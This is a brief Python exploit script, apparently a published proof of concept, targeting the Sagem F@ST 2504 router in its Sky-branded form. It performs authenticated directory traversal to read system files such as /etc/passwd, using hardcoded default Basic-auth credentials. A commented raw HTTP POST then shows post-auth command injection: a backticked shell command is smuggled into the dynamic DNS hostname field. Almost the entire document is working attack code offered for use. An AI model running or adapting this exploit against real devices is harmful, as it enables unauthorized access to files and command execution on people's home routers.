# Sagem F@ST 2504 Sky1.5 directory traversal
# ==========================================
# + Auth Bypass due to can't set User password.
# + CGI does not handle ../ traversal request.
# - micro_httpd does not spot in URI request.
#
# Use with ./sky.py <target.ip> </etc/passwd>
import sys
import os
import httplib

def sendexploit(host,path):
	server = httplib.HTTPConnection(host)
	server.putrequest('GET',path)
	server.putheader('Accept','text/html')
	server.putheader('Authorization','Basic dXNlcjp1c2Vy')
	server.endheaders()
	response = server.getresponse()
	data = response.read()
	if data.find("No element returned.") == 0: 
		print sys.argv[2] + ": file found."

if __name__ == "__main__":
	host = sys.argv[1]
	path = "/sky_temp.html?status=501&title=&text=&this_file=.." + sys.argv[2]
        sendexploit(host,path)

# Post-auth RCE PoC
#
# POST /sky_setup.cgi HTTP/1.1
# Host: 192.168.0.1
# User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.11) Gecko/2009060214 Firefox/3.0.11
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
# Accept-Language: en-us,en;q=0.5
# Accept-Encoding: gzip,deflate
# Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
# Keep-Alive: 300
# Proxy-Connection: keep-alive
# Referer: http://192.168.0.1/sky_dynamic_dns.html
# Authorization: Basic YWRtaW46c2t5
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 336
#
# dyndnsEnable=on&sysDNSProviderlist=www.DynDNS.org&ddnsHostname=`/bin/ping 192.168.0.4`&dyndnsUsername=123&dyndnsPassword=123&ddnsInterface=ppp_0_38_1&dyndnsWildcard=on&todo=save&this_file=sky_dynamic_dns.html&next_file=sky_dynamic_dns.html&h_dyndnsEnable=enable&h_sysDNSProviderlist=&h_dyndnsWildcard=enable&save.x=8&save.y=4&save=Apply

